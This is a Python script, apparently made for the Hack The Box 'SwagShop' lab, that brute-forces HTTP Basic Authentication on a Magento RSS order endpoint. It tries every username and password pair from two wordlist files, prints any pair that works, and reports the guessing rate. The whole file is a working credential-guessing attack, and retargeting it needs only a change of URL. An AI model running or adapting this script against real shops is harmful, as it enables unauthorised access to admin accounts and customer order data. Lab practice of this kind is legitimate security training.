import requests,time
from requests.auth import HTTPBasicAuth
#Set variables
base_url = "http://swagshop.htb/index.php/"
endpoint_path = "rss/order/new"
username_list = "usernames.txt"
password_list = "passwords.txt"
success = 0
counter = 0
counter_interval = 0
interval = 100
s = requests.Session()
#print header
print ("\nMAGENTO BRUTE FORCE DEMONSTRATION\n----------------------------------------")
print ("Starting attack on %s ...\n" % (base_url+endpoint_path))
#start timer
time_start=time.time()
time_interval = time_start
#start iteration
with open(username_list,'r') as list_username:
  for username in list_username:
    username = username.replace('\n','')
    with open(password_list,'r') as list_password:
      for password in list_password:
        password = password.replace('\n','')
        #launch request
        s = requests.get(base_url+endpoint_path, auth=HTTPBasicAuth(username,password))
        #detect status returned
        if s.status_code!=401:
          success = 1
          print ("SUCCESS: Username: %s Password: %s" % (username,password))
          break
        counter+=1
        counter_interval+=1
        #update code
        if counter_interval==interval:
          print ("Tried %s combinations, rate %s combinations/s" % (str(counter),str(round(interval/(time.time()-time_interval),1))))
          counter_interval=0
          time_interval=time.time()
    if success==1: break
time_end = time.time()
#print footer
print ("FINISHED. Tried %s combinations" % (str(counter)))
print ("Duration: %s seconds" % (str(round(time_end-time_start,2))))
